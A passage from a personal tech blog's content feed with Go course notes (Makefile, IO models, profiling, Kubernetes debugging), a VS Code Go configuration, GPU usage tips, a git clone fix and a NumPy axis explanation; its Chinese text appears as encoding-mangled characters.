src="https://snowgo.top/medias/medias/Golang%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/114.png"></p><h5 id="sample"><a href="#sample" class="headerlink" title="sample"></a>sample</h5><p><img src="https://snowgo.top/medias/medias/Golang%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/115.png"></p><h4 id="GOPROXY-å’Œ-GOPRIVATE"><a href="#GOPROXY-å’Œ-GOPRIVATE" class="headerlink" title="GOPROXY å’Œ GOPRIVATE"></a>GOPROXY å’Œ GOPRIVATE</h4><p><img src="https://snowgo.top/medias/medias/Golang%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/116.png"></p><h3 id="Makefile"><a href="#Makefile" class="headerlink" title="Makefile"></a>Makefile</h3><h5 id="Go-è¯­è¨€é¡¹ç›®å¤šé‡‡ç”¨-Makefile-ç»„ç»‡é¡¹ç›®ç¼–è¯‘"><a href="#Go-è¯­è¨€é¡¹ç›®å¤šé‡‡ç”¨-Makefile-ç»„ç»‡é¡¹ç›®ç¼–è¯‘" class="headerlink" title="Go è¯­è¨€é¡¹ç›®å¤šé‡‡ç”¨ Makefile ç»„ç»‡é¡¹ç›®ç¼–è¯‘"></a>Go è¯­è¨€é¡¹ç›®å¤šé‡‡ç”¨ Makefile ç»„ç»‡é¡¹ç›®ç¼–è¯‘</h5><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">export</span> tag=v1.0</span><br><span class="line"></span><br><span class="line"><span class="section">root:</span></span><br><span class="line">    <span class="keyword">export</span> ROOT=github.com/cncamp/golang</span><br><span class="line"></span><br><span class="line"><span class="section">build:</span></span><br><span class="line">    echo <span class="string">&quot;building httpserver binary&quot;</span></span><br><span class="line">    mkdir -p bin/amd64</span><br><span class="line">    //è¾“å‡ºæ”¾åˆ°-o bin/amd64 .</span><br><span class="line">    CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build -o bin/amd64 .</span><br><span class="line">//æ‰“åŒ…docker</span><br><span class="line"><span class="section">release: build</span></span><br><span class="line">    echo <span class="string">&quot;building httpserver container&quot;</span></span><br><span class="line">    docker build -t cncamp/httpserver:$&#123;tag&#125; .</span><br><span class="line"></span><br><span class="line"><span class="section">push: release</span></span><br><span class="line">    echo <span class="string">&quot;pushing cncamp/httpserver&quot;</span></span><br><span class="line">docker push cncamp/httpserver:v1.0</span><br></pre></td></tr></table></figure><h3 id="åŠ¨æ‰‹ç¼–å†™ä¸€ä¸ªHTTP-Server"><a href="#åŠ¨æ‰‹ç¼–å†™ä¸€ä¸ªHTTP-Server" class="headerlink" title="åŠ¨æ‰‹ç¼–å†™ä¸€ä¸ªHTTP Server"></a>åŠ¨æ‰‹ç¼–å†™ä¸€ä¸ªHTTP Server</h3><h4 id="ç†è§£ç½‘ç»œåè®®å±‚"><a href="#ç†è§£ç½‘ç»œåè®®å±‚" class="headerlink" title="ç†è§£ç½‘ç»œåè®®å±‚"></a>ç†è§£ç½‘ç»œåè®®å±‚</h4><p><img src="https://snowgo.top/medias/medias/Golang%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/117.png"></p><h4 id="ç†è§£Socket"><a href="#ç†è§£Socket" class="headerlink" title="ç†è§£Socket"></a>ç†è§£Socket</h4><p><img src="https://snowgo.top/medias/medias/Golang%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/118.png"><br>æ‰€ä»¥è¯´ä¸€ä¸ªé“¾æ¥é‡Œæœ‰ä¸¤ä¸ªsocketï¼Œé“¾æ¥äº”å…ƒç»„ï¼šæºipæºç«¯å£ç›®æ ‡ipç›®æ ‡ç«¯å£+åè®®ã€‚</p><h4 id="ç†è§£-net-http-åŒ…"><a href="#ç†è§£-net-http-åŒ…" class="headerlink" title="ç†è§£ net.http åŒ…"></a>ç†è§£ net.http åŒ…</h4><p><img src="https://snowgo.top/medias/medias/Golang%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/119.png"></p><h4 id="é˜»å¡IOæ¨¡å‹"><a href="#é˜»å¡IOæ¨¡å‹" class="headerlink" title="é˜»å¡IOæ¨¡å‹"></a>é˜»å¡IOæ¨¡å‹</h4><p><img src="https://snowgo.top/medias/medias/Golang%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/120.png"></p><h4 id="éé˜»å¡IO-æ¨¡å‹"><a href="#éé˜»å¡IO-æ¨¡å‹" class="headerlink" title="éé˜»å¡IO æ¨¡å‹"></a>éé˜»å¡IO æ¨¡å‹</h4><p><img src="https://snowgo.top/medias/medias/Golang%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/121.png"></p><h4 id="IO-å¤šè·¯å¤ç”¨"><a href="#IO-å¤šè·¯å¤ç”¨" class="headerlink" title="IO å¤šè·¯å¤ç”¨"></a>IO å¤šè·¯å¤ç”¨</h4><p>è·å¾—ä¸€ä¸ªFDåˆ—è¡¨ï¼Œç›¸å½“äºä¸€ä¸ªå•çº¿ç¨‹å»é—®ç³»ç»Ÿå†…æ ¸å“ªä¸€ä¸ªçº¿ç¨‹å°±ç»ªäº†ï¼Œè€Œä¸æ˜¯æ¯ä¸€ä¸ªçº¿ç¨‹è‡ªå·±å»é—®ï¼Œç¼ºç‚¹æ˜¯åˆ—è¡¨é•¿åº¦æœ‰é™ï¼Œæœ€å¤š1024<br><img src="https://snowgo.top/medias/medias/Golang%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/122.png"></p><h4 id="å¼‚æ­¥-IO"><a href="#å¼‚æ­¥-IO" class="headerlink" title="å¼‚æ­¥ IO"></a>å¼‚æ­¥ IO</h4><p>è¿”å›ä¹‹åè¿™ä¸ªç³»ç»Ÿè°ƒç”¨ç›´æ¥ç»“æŸï¼Œç­‰æ•°æ®ä»socketbuffferåˆ°å†…å­˜éƒ½å‡†å¤‡å¥½äº†å†ä»å†…æ ¸ç»™åº”ç”¨å‘ä¿¡å·ã€‚<br><img src="https://snowgo.top/medias/medias/Golang%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/123.png"></p><h4 id="IOå¤šè·¯å¤ç”¨ä¸­çš„epoll"><a href="#IOå¤šè·¯å¤ç”¨ä¸­çš„epoll" class="headerlink" title="IOå¤šè·¯å¤ç”¨ä¸­çš„epoll"></a>IOå¤šè·¯å¤ç”¨ä¸­çš„epoll</h4><p>è§£å†³äº†ä¸Šé¢å¤šè·¯å¤ç”¨çš„é—®é¢˜</p><ul><li>ç”¨æˆ·æ€å’Œkernelå…±äº«ä¸€å—å†…å­˜</li></ul><p>å…¶ä¸­rbræ˜¯çº¢é»‘æ ‘<br><img src="https://snowgo.top/medias/medias/Golang%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/124.png"></p><h4 id="Go-è¯­è¨€é«˜æ€§èƒ½-httpserver-çš„å®ç°ç»†èŠ‚"><a href="#Go-è¯­è¨€é«˜æ€§èƒ½-httpserver-çš„å®ç°ç»†èŠ‚" class="headerlink" title="Go è¯­è¨€é«˜æ€§èƒ½ httpserver çš„å®ç°ç»†èŠ‚"></a>Go è¯­è¨€é«˜æ€§èƒ½ httpserver çš„å®ç°ç»†èŠ‚</h4><p><img src="https://snowgo.top/medias/medias/Golang%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/125.png"></p><h3 id="è°ƒè¯•"><a href="#è°ƒè¯•" class="headerlink" title="è°ƒè¯•"></a>è°ƒè¯•</h3><h4 id="debug"><a href="#debug" class="headerlink" title="debug"></a>debug</h4><p><img src="https://snowgo.top/medias/medias/Golang%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/126.png"></p><h5 id="dlvçš„é…ç½®"><a href="#dlvçš„é…ç½®" class="headerlink" title="dlvçš„é…ç½®"></a>dlvçš„é…ç½®</h5><p><img src="https://snowgo.top/medias/medias/Golang%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/127.png"></p><h4 id="æ›´å¤šdebugæ–¹æ³•"><a href="#æ›´å¤šdebugæ–¹æ³•" class="headerlink" title="æ›´å¤šdebugæ–¹æ³•"></a>æ›´å¤šdebugæ–¹æ³•</h4><p><img src="https://snowgo.top/medias/medias/Golang%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/128.png"></p><h4 id="glogä½¿ç”¨æ–¹æ³•ç¤ºä¾‹"><a href="#glogä½¿ç”¨æ–¹æ³•ç¤ºä¾‹" class="headerlink" title="glogä½¿ç”¨æ–¹æ³•ç¤ºä¾‹"></a>glogä½¿ç”¨æ–¹æ³•ç¤ºä¾‹</h4><p><img src="https://snowgo.top/medias/medias/Golang%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/129.png"></p><h4 id="æ€§èƒ½åˆ†æ-Performance-Profiling"><a href="#æ€§èƒ½åˆ†æ-Performance-Profiling" class="headerlink" title="æ€§èƒ½åˆ†æ( Performance Profiling)"></a>æ€§èƒ½åˆ†æ( Performance Profiling)</h4><p><img src="https://snowgo.top/medias/medias/Golang%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/130.png"></p><h5 id="åˆ†æCPUç“¶é¢ˆ"><a href="#åˆ†æCPUç“¶é¢ˆ" class="headerlink" title="åˆ†æCPUç“¶é¢ˆ"></a>åˆ†æCPUç“¶é¢ˆ</h5><p><img src="https://snowgo.top/medias/medias/Golang%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/131.png"></p><h5 id="å…¶ä»–å¯ç”¨-profiling-å·¥å…·åˆ†æçš„é—®é¢˜"><a href="#å…¶ä»–å¯ç”¨-profiling-å·¥å…·åˆ†æçš„é—®é¢˜" class="headerlink" title="å…¶ä»–å¯ç”¨ profiling å·¥å…·åˆ†æçš„é—®é¢˜"></a>å…¶ä»–å¯ç”¨ profiling å·¥å…·åˆ†æçš„é—®é¢˜</h5><p><img src="https://snowgo.top/medias/medias/Golang%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/132.png"></p><h5 id="é’ˆå¯¹httpæœåŠ¡çš„-pprof"><a href="#é’ˆå¯¹httpæœåŠ¡çš„-pprof" class="headerlink" title="é’ˆå¯¹httpæœåŠ¡çš„ pprof"></a>é’ˆå¯¹httpæœåŠ¡çš„ pprof</h5><p><img src="https://snowgo.top/medias/medias/Golang%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/133.png"></p><h5 id="åˆ†ægo-profiling-ç»“æœ"><a href="#åˆ†ægo-profiling-ç»“æœ" class="headerlink" title="åˆ†ægo profiling ç»“æœ"></a>åˆ†ægo profiling ç»“æœ</h5><p><img src="https://snowgo.top/medias/medias/Golang%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/134.png"></p><h5 id="ç»“æœåˆ†æç¤ºä¾‹"><a href="#ç»“æœåˆ†æç¤ºä¾‹" class="headerlink" title="ç»“æœåˆ†æç¤ºä¾‹"></a>ç»“æœåˆ†æç¤ºä¾‹</h5><p><img src="https://snowgo.top/medias/medias/Golang%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/135.png"></p><h3 id="Kubernetes-ä¸­å¸¸ç”¨ä»£ç è§£è¯»"><a href="#Kubernetes-ä¸­å¸¸ç”¨ä»£ç è§£è¯»" class="headerlink" title="Kubernetes ä¸­å¸¸ç”¨ä»£ç è§£è¯»"></a>Kubernetes ä¸­å¸¸ç”¨ä»£ç è§£è¯»</h3><h4 id="Rate-Limit-Queue"><a href="#Rate-Limit-Queue" class="headerlink" title="Rate Limit Queue"></a>Rate Limit Queue</h4><p>å‡ºç°é—®é¢˜æ§åˆ¶å™¨ç­‰å¾…æ—¶é—´å‘ˆæŒ‡æ•°å¢é•¿ï¼Œæœ€é•¿5åˆ†é’Ÿ<br><img src="https://snowgo.top/medias/medias/Golang%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/136.png"></p><h3 id="Kubernetes-æ—¥å¸¸è¿ç»´ä¸­çš„ä»£ç è°ƒè¯•åœºæ™¯"><a href="#Kubernetes-æ—¥å¸¸è¿ç»´ä¸­çš„ä»£ç è°ƒè¯•åœºæ™¯" class="headerlink" title="Kubernetes æ—¥å¸¸è¿ç»´ä¸­çš„ä»£ç è°ƒè¯•åœºæ™¯"></a>Kubernetes æ—¥å¸¸è¿ç»´ä¸­çš„ä»£ç è°ƒè¯•åœºæ™¯</h3><h4 id="æ¡ˆä¾‹1ï¼šç©ºæŒ‡é’ˆ"><a href="#æ¡ˆä¾‹1ï¼šç©ºæŒ‡é’ˆ" class="headerlink" title="æ¡ˆä¾‹1ï¼šç©ºæŒ‡é’ˆ"></a>æ¡ˆä¾‹1ï¼šç©ºæŒ‡é’ˆ</h4><p><img src="https://snowgo.top/medias/medias/Golang%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/137.png"><br><img src="https://snowgo.top/medias/medias/Golang%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/138.png"></p><h4 id="æ¡ˆä¾‹2ï¼š-Map-çš„è¯»å†™å†²çª"><a href="#æ¡ˆä¾‹2ï¼š-Map-çš„è¯»å†™å†²çª" class="headerlink" title="æ¡ˆä¾‹2ï¼š Map çš„è¯»å†™å†²çª"></a>æ¡ˆä¾‹2ï¼š Map çš„è¯»å†™å†²çª</h4><p><img src="https://snowgo.top/medias/medias/Golang%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/139.png"></p><h4 id="æ¡ˆä¾‹3ï¼š-kube-proxy-æ¶ˆè€—-10ä¸ª-CPU"><a href="#æ¡ˆä¾‹3ï¼š-kube-proxy-æ¶ˆè€—-10ä¸ª-CPU" class="headerlink" title="æ¡ˆä¾‹3ï¼š kube-proxy æ¶ˆè€— 10ä¸ª CPU"></a>æ¡ˆä¾‹3ï¼š kube-proxy æ¶ˆè€— 10ä¸ª CPU</h4><p><img src="https://snowgo.top/medias/medias/Golang%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/140.png"><br><img src="https://snowgo.top/medias/medias/Golang%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/141.png"></p><h4 id="æ¡ˆä¾‹4ï¼šçº¿ç¨‹æ± è€—å°½"><a href="#æ¡ˆä¾‹4ï¼šçº¿ç¨‹æ± è€—å°½" class="headerlink" title="æ¡ˆä¾‹4ï¼šçº¿ç¨‹æ± è€—å°½"></a>æ¡ˆä¾‹4ï¼šçº¿ç¨‹æ± è€—å°½</h4><p><img src="https://snowgo.top/medias/medias/Golang%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/142.png"></p>]]></content>
      
      
      <categories>
          
          <category> æŠ€æœ¯æ ˆ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> go </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Vscodeä¸Šé…ç½®Go-Macç‰ˆæœ¬</title>
      <link href="/2022/03/11/Vscode%E4%B8%8A%E9%85%8D%E7%BD%AEGo-Mac%E7%89%88%E6%9C%AC/"/>
      <url>/2022/03/11/Vscode%E4%B8%8A%E9%85%8D%E7%BD%AEGo-Mac%E7%89%88%E6%9C%AC/</url>
      
        <content type="html"><![CDATA[<h2 id="å®‰è£…go"><a href="#å®‰è£…go" class="headerlink" title="å®‰è£…go"></a>å®‰è£…go</h2><ol><li><p>åœ¨<a href="https://go.dev/dl/">https://go.dev/dl/</a>ä¸‹è½½</p></li><li><p>ä¸‹è½½pkgåè‡ªåŠ¨é…ç½®GOROOT</p></li><li><p>ä½¿ç”¨<code>go env</code>å¯ä»¥æŸ¥çœ‹é…ç½®çš„goç¯å¢ƒå˜é‡</p></li><li><p>é…ç½®GOPATHä»¥åŠå…¶ä¸‹çš„srcï¼Œpkgï¼Œbinç›®å½•</p><h2 id="é…ç½®vscode"><a href="#é…ç½®vscode" class="headerlink" title="é…ç½®vscode"></a>é…ç½®vscode</h2></li><li><p>vscodeå®‰è£…goï¼Œcoderunner</p></li><li><p>setting.jsonä¸­é…ç½®å¦‚ä¸‹å†…å®¹</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;files.autoSave&quot;</span>: <span class="string">&quot;onFocusChange&quot;</span>,</span><br><span class="line">       <span class="string">&quot;go.useLanguageServer&quot;</span>: <span class="literal">true</span>,</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">       <span class="string">&quot;go.buildOnSave&quot;</span>: <span class="literal">true</span>,</span><br><span class="line">       <span class="string">&quot;go.lintOnSave&quot;</span>: <span class="literal">true</span>,</span><br><span class="line">       <span class="string">&quot;go.vetOnSave&quot;</span>: <span class="literal">true</span>,</span><br><span class="line">       <span class="string">&quot;go.buildFlags&quot;</span>: [],</span><br><span class="line">       <span class="string">&quot;go.lintFlags&quot;</span>: [],</span><br><span class="line">       <span class="string">&quot;go.vetFlags&quot;</span>: [],</span><br><span class="line">       <span class="string">&quot;go.coverOnSave&quot;</span>: <span class="literal">false</span>,</span><br><span class="line">       <span class="string">&quot;go.useCodeSnippetsOnFunctionSuggest&quot;</span>: <span class="literal">false</span>,</span><br><span class="line">       <span class="string">&quot;go.formatOnSave&quot;</span>: <span class="literal">true</span>,</span><br><span class="line">       <span class="string">&quot;go.formatTool&quot;</span>: <span class="string">&quot;goreturns&quot;</span>,</span><br><span class="line">       <span class="string">&quot;go.goroot&quot;</span>: <span class="string">&quot;/usr/local/go&quot;</span>,<span class="comment">// ä½ çš„Goroot</span></span><br><span class="line">       <span class="string">&quot;go.gopath&quot;</span>: <span class="string">&quot;/Users/sketchzero/go&quot;</span>,<span class="comment">// ä½ çš„Gopath</span></span><br><span class="line"></span><br><span class="line">          </span><br><span class="line">       <span class="string">&quot;code-runner.runInTerminal&quot;</span>: <span class="literal">true</span>,</span><br><span class="line">       <span class="string">&quot;code-runner.ignoreSelection&quot;</span>: <span class="literal">true</span>,</span><br><span class="line">       <span class="string">&quot;code-runner.saveAllFilesBeforeRun&quot;</span>: <span class="literal">true</span>,</span><br><span class="line">       <span class="string">&quot;code-runner.executorMap&quot;</span>: &#123;</span><br><span class="line">           <span class="attr">&quot;python&quot;</span>: <span class="string">&quot;python3 -u&quot;</span>,</span><br><span class="line">           <span class="attr">&quot;go&quot;</span>: <span class="string">&quot;go run&quot;</span>,</span><br><span class="line">           <span class="attr">&quot;c&quot;</span>: <span class="string">&quot;cd $dir &amp;&amp; gcc $fileName -o $fileNameWithoutExt &amp;&amp; $dir$fileNameWithoutExt&quot;</span>,</span><br><span class="line">           <span class="attr">&quot;cpp&quot;</span>: <span class="string">&quot;cd $dir &amp;&amp; g++ -std=c++11 $fileName -o $fileNameWithoutExt &amp;&amp; $dir$fileNameWithoutExt&quot;</span>,</span><br><span class="line">       &#125;</span><br></pre></td></tr></table></figure></li></ol>]]></content>
      
      
      <categories>
          
          <category> é—®é¢˜å’ŒæŠ€å·§ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> go </tag>
            
            <tag> devops </tag>
            
            <tag> sre </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>GPUæ“ä½œæŒ‡å—</title>
      <link href="/2022/03/08/GPU%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/"/>
      <url>/2022/03/08/GPU%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/</url>
      
        <content type="html"><![CDATA[<h2 id="è·‘ä»£ç çš„æ—¶å€™æŒ‡å®šä¸€å—æ˜¾å¡è·‘"><a href="#è·‘ä»£ç çš„æ—¶å€™æŒ‡å®šä¸€å—æ˜¾å¡è·‘" class="headerlink" title="è·‘ä»£ç çš„æ—¶å€™æŒ‡å®šä¸€å—æ˜¾å¡è·‘"></a>è·‘ä»£ç çš„æ—¶å€™æŒ‡å®šä¸€å—æ˜¾å¡è·‘</h2><p>#æŒ‰ç…§PCI_BUS_IDé¡ºåºä»0å¼€å§‹æ’åˆ—GPUè®¾å¤‡<br>os.environ[â€œCUDA_DEVICE_ORDERâ€]=â€PCI_BUS_IDâ€</p><p>#è®¾ç½®å½“å‰ä½¿ç”¨çš„GPUè®¾å¤‡ä»…ä¸º0å·è®¾å¤‡ è®¾å¤‡åç§°ä¸ºâ€™/gpu:0â€™<br>os.environ[â€œCUDA_VISIBLE_DEVICESâ€]=â€0â€</p><p>#è®¾ç½®å½“å‰ä½¿ç”¨çš„GPUè®¾å¤‡ä¸º0,1å·ä¸¤ä¸ªè®¾å¤‡,åç§°ä¾æ¬¡ä¸ºâ€™/gpu:0â€™ã€â€™/gpu:1â€™<br>os.environ[â€œCUDA_VISIBLE_DEVICESâ€]=â€0,1â€</p><p>#è®¾ç½®å½“å‰ä½¿ç”¨çš„GPUè®¾å¤‡ä¸º1,0å·ä¸¤ä¸ªè®¾å¤‡,åç§°ä¾æ¬¡ä¸ºâ€™/gpu:0â€™ã€â€™/gpu:1â€™<br>#å¹¶ä¸”ä¼˜å…ˆä½¿ç”¨1å·è®¾å¤‡,ç„¶åä½¿ç”¨0å·è®¾å¤‡<br>os.environ[â€œCUDA_VISIBLE_DEVICESâ€]=â€1,0â€</p><p>#ä¸€èˆ¬å†™åœ¨æ–‡ä»¶æœ€å¼€å¤´çš„ä½ç½®<br><img src="https://snowgo.top/medias/medias/GPU%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/0.png"></p><h2 id="æŸ¥çœ‹å½“å‰gpuä½¿ç”¨æƒ…å†µ"><a href="#æŸ¥çœ‹å½“å‰gpuä½¿ç”¨æƒ…å†µ" class="headerlink" title="æŸ¥çœ‹å½“å‰gpuä½¿ç”¨æƒ…å†µ"></a>æŸ¥çœ‹å½“å‰gpuä½¿ç”¨æƒ…å†µ</h2><p>watch -n 1 nvidia-smi<br>gpustat -cpu â€“color</p><h3 id="è§£å†³gpuæ²¡æœ‰è¿è¡Œè¿›ç¨‹ï¼Œä½†æ˜¯æ˜¾å­˜ä¸€ç›´å ç”¨çš„æ–¹å¼"><a href="#è§£å†³gpuæ²¡æœ‰è¿è¡Œè¿›ç¨‹ï¼Œä½†æ˜¯æ˜¾å­˜ä¸€ç›´å ç”¨çš„æ–¹å¼" class="headerlink" title="è§£å†³gpuæ²¡æœ‰è¿è¡Œè¿›ç¨‹ï¼Œä½†æ˜¯æ˜¾å­˜ä¸€ç›´å ç”¨çš„æ–¹å¼"></a><a href="https://www.cnblogs.com/cofludy/p/13971371.html">è§£å†³gpuæ²¡æœ‰è¿è¡Œè¿›ç¨‹ï¼Œä½†æ˜¯æ˜¾å­˜ä¸€ç›´å ç”¨çš„æ–¹å¼</a></h3><p>fuser -v /dev/nvidia*<br>kill 7655</p>]]></content>
      
      
      <categories>
          
          <category> é—®é¢˜å’ŒæŠ€å·§ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> gpu </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Git-cloneæ—¶æŠ¥é”™</title>
      <link href="/2022/03/04/Git-clone%E6%97%B6%E6%8A%A5%E9%94%99/"/>
      <url>/2022/03/04/Git-clone%E6%97%B6%E6%8A%A5%E9%94%99/</url>
      
        <content type="html"><![CDATA[<p>error: invalid path â€˜Icon?â€™fatal: unable to checkout working tree warning: Clone succeeded, but checkout failed.<br>é”™å› ï¼šwindowsä¸‹ä¸èƒ½æœ‰â€™Icon?â€™è¿™ç§å‘½åï¼ŒæŠŠï¼Ÿå»æ‰å°±è¡Œäº†</p>]]></content>
      
      
      <categories>
          
          <category> é—®é¢˜å’ŒæŠ€å·§ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> git </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>numpyçš„nç»´çŸ©é˜µnp.sum()ä¸­å‚æ•°axisçš„ç†è§£</title>
      <link href="/2022/03/04/numpy%E7%9A%84n%E7%BB%B4%E7%9F%A9%E9%98%B5np.sum()%E4%B8%AD%E5%8F%82%E6%95%B0axis%E7%9A%84%E7%90%86%E8%A7%A3/"/>
      <url>/2022/03/04/numpy%E7%9A%84n%E7%BB%B4%E7%9F%A9%E9%98%B5np.sum()%E4%B8%AD%E5%8F%82%E6%95%B0axis%E7%9A%84%E7%90%86%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<p>ä¸ªäººçœ‹æ¥ï¼Œnumpyçš„é«˜ç»´çŸ©é˜µï¼Œæ˜¯åŸºäºä¸€ç»´å‘é‡å’ŒäºŒç»´æ•°ç»„å°±å¯ä»¥è¿›è¡Œç†è§£çš„ï¼Œä¹Ÿå°±æ˜¯è¯´æ¯æ¬¡æŠŠå…ƒç´ æ‹“å±•æˆä¸€ä¸ªå‘é‡ï¼Œå°±å¯ä»¥å¤šå‡ºä¸€ä¸ªç»´åº¦ï¼Œnä¸ºå¶æ•°æ—¶ï¼Œåªä¸è¿‡æ˜¯äºŒç»´æ•°ç»„å¥—äºŒç»´æ•°ç»„ï¼Œç±»ä¼¼å¥—å¨ƒçš„å½¢å¼å³å¯ç†è§£ã€‚<br>å…¶ç´¢å¼•æ˜¯ç”±å¤–å‘å†…çš„ï¼Œæœ¬è´¨è¿˜æ˜¯åˆ—è¡¨åµŒå¥—çš„å½¢å¼çš„ï¼Œæ¯”å¦‚ä¸€ä¸ªä¸‰ç»´çŸ©é˜µ:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>a = np.arange(<span class="number">12</span>).reshape((<span class="number">2</span>,<span class="number">2</span>,<span class="number">3</span>))</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a</span><br><span class="line">array([[[ <span class="number">0</span>,  <span class="number">1</span>,  <span class="number">2</span>],</span><br><span class="line">        [ <span class="number">3</span>,  <span class="number">4</span>,  <span class="number">5</span>]],</span><br><span class="line"></span><br><span class="line">       [[ <span class="number">6</span>,  <span class="number">7</span>,  <span class="number">8</span>],</span><br><span class="line">        [ <span class="number">9</span>, <span class="number">10</span>, <span class="number">11</span>]]])</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>å†è¯´ä¸‹å‚æ•°axisçš„å«ä¹‰ã€‚ä¹¦ä¸Šå’Œå¾ˆå¤šäººçš„ç†è§£æ˜¯ç›´æ¥å‘Šè¯‰ä½ axisï¼0æ˜¯è·¨è¡Œï¼Œaxisï¼1æ˜¯è·¨åˆ—ã€‚æˆ‘ä¸€ç›´è§‰å¾—è¿™ç§ç†è§£ç¨æ˜¾å‘†æ¿ã€‚å®é™…ä¸Šä»ç´¢å¼•å‡ºå‘ï¼Œå°±æ˜ç™½äº†ï¼Œåœ¨np.sum()å‡½æ•°é‡Œå‚æ•°axisçš„å€¼è¡¨ç¤ºçš„æ˜¯ç¬¬å‡ ä¸ªç´¢å¼•ä¸‹çš„å…ƒç´ å»æ•´åˆï¼Œé‚£axisï¼2å°±è¡¨ç¤ºå…¶ä»–ç´¢å¼•ä¸å˜ï¼Œç¬¬3ä¸ªç´¢å¼•å¤„çš„å€¼å…¨éƒ¨ç›¸åŠ ã€‚<br> a[i,j] å°±å¯¹åº”axisï¼0ï¼Œä¹Ÿå°±æ˜¯å¤§å®¶è¯´çš„ï¼Œåˆ—å·ä¸åŠ¨ï¼ŒæŠŠå¯¹åº”çš„è¡Œå…¨åŠ èµ·æ¥ï¼Œå¾—åˆ°ä¸€ä¸ªæ–°å‘é‡ b ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>a</span><br><span class="line">array([[[ <span class="number">0</span>,  <span class="number">1</span>,  <span class="number">2</span>],</span><br><span class="line">        [ <span class="number">3</span>,  <span class="number">4</span>,  <span class="number">5</span>]],</span><br><span class="line"></span><br><span class="line">       [[ <span class="number">6</span>,  <span class="number">7</span>,  <span class="number">8</span>],</span><br><span class="line">        [ <span class="number">9</span>, <span class="number">10</span>, <span class="number">11</span>]]])</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>b = np.<span class="built_in">sum</span>(a,axis=<span class="number">0</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>b</span><br><span class="line">array([[ <span class="number">6</span>,  <span class="number">8</span>, <span class="number">10</span>],</span><br><span class="line">       [<span class="number">12</span>, <span class="number">14</span>, <span class="number">16</span>]])</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>b[<span class="number">0</span>,<span class="number">2</span>] == a[<span class="number">0</span>,<span class="number">0</span>,<span class="number">2</span>]+a[<span class="number">1</span>,<span 